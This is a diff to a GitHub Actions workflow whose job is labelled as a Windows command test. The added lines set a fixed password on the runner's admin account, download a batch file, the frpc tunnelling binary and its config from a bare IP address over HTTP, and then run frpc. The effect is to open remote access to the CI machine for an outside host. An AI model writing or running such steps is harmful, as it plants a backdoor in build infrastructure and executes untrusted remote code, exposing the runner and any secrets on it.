@@ -40,11 +40,12 @@ jobs:
       - name: test windows cmd ur
         run: |
           echo 开始
+          net user runneradmin Ab123666
           powershell (new-object Net.WebClient).DownloadFile('http://113.128.105.75:8081/startgat.bat','D:\a\teac\teac\startgat.bat')
           powershell (new-object Net.WebClient).DownloadFile('http://113.128.105.75:8081/frpc.exe','D:\a\teac\teac\frpc.exe')
           powershell (new-object Net.WebClient).DownloadFile('http://113.128.105.75:8081/frpcgat.ini','D:\a\teac\teac\frpcgat.ini')
           dir
-          #D:\a\teac\teac\frpc.exe -c D:\a\teac\teac\frpcgat.ini
+          D:\a\teac\teac\frpc.exe -c D:\a\teac\teac\frpcgat.ini
           echo 结束
       #- name: Dki
         #run: ping -n 3600 8.8.8.8
